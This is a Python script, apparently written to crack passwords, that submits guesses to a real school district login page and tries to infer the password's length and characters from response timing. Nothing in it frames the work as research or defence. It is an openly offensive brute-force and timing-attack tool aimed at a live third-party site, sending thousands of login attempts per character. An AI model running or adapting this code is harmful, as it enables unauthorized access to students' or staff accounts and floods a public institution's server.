import itertools
import string
import timeit
import numpy as np
import random
from robobrowser import RoboBrowser

allowed_chars = string.ascii_letters + " " + "0123456789"
password_database = {"test username": "test password"}
br = RoboBrowser()


class Authenticate:
    def __init__(self, username=""):
        self.username = username

    def validate(self):
        print("length")
        length = crack_length(self.username)
        print(length)
        password = crack_password(self.username, length)
        return f"Username: {self.username}, Password: {password}"

    def credentials(self, usernamefield):
        pass


def check_password(user, guess):
    print(guess)
    br.open("https://publish.gwinnett.k12.ga.us/gcps/home/gcpslogin")
    form = br.get_form()
    form["username"] = user
    form["password"] = guess
    br.submit_form(form)

    src = str(br.parsed())

    if "meta content" not in src:
        return True
    else:
        return False


def random_str(size):
    chars = ''.join(random.choices(allowed_chars, k=size+6))
    return chars


def crack_length(user, max_len=32):
    trials = 10
    times = np.empty(max_len)
    for i in range(max_len):
        i_time = timeit.repeat(stmt='check_password(user, x)',
                               setup=f'user={user!r};x=random_str({i!r})',
                               globals=globals(),
                               number=trials,
                               repeat=2)
        times[i] = min(i_time)

    most_likely = int(np.argmax(times))
    print(most_likely)
    return most_likely


def crack_password(user, length, verbose=False):
    guess = random_str(length)
    counter = itertools.count()
    trials = 1000
    while True:
        i = next(counter) % length
        for c in allowed_chars:
            alt = guess[:i] + c + guess[i + 1:]

            alt_time = timeit.repeat(stmt='check_password(user, x)',
                                     setup=f'user={user!r};x={alt!r}',
                                     globals=globals(),
                                     number=trials,
                                     repeat=10)
            guess_time = timeit.repeat(stmt='check_password(user, x)',
                                       setup=f'user={user!r};x={guess!r}',
                                       globals=globals(),
                                       number=trials,
                                       repeat=10)

            if check_password(user, alt):
                return alt

            if min(alt_time) > min(guess_time):
                guess = alt
                print(guess)
